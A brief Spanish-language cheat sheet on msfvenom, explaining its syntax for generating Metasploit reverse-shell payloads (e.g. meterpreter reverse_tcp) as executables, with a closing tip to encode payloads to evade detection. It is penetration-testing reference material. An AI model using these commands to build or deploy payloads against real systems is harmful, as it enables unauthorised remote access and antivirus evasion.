### 🔥 **MSFVenom - Generación de Payloads en Metasploit** 🔥

`msfvenom` es una herramienta de **Metasploit** para generar payloads personalizados y crear ejecutables maliciosos. Combina las funciones de `msfpayload` y `msfencode` en una sola utilidad.

---

## 🔹 **1. Sintaxis básica**

```bash
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PUERTO> -f <FORMATO> -o <ARCHIVO>
```

✅ **Explicación**:

- `-p <PAYLOAD>` → Especifica el tipo de payload (ej. `windows/meterpreter/reverse_tcp`).
- `LHOST=<IP>` → Dirección IP del atacante (tu máquina).
- `LPORT=<PUERTO>` → Puerto donde escucharás la conexión.
- `-f <FORMATO>` → Formato de salida (ej. `exe`, `elf`, `apk`, `raw`, `c`, `python`).
- `-o <ARCHIVO>` → Nombre del archivo de salida.

---
# Resumen

🚀 `msfvenom` es una herramienta poderosa para crear payloads personalizados y obtener acceso remoto a sistemas vulnerables. Para hacerlo más efectivo: ✅ Usa `-e` para evadir detección.  
✅ Modifica manualmente los payloads (`-f c`, `-f python`).  
✅ Configura correctamente `LHOST` y `LPORT`.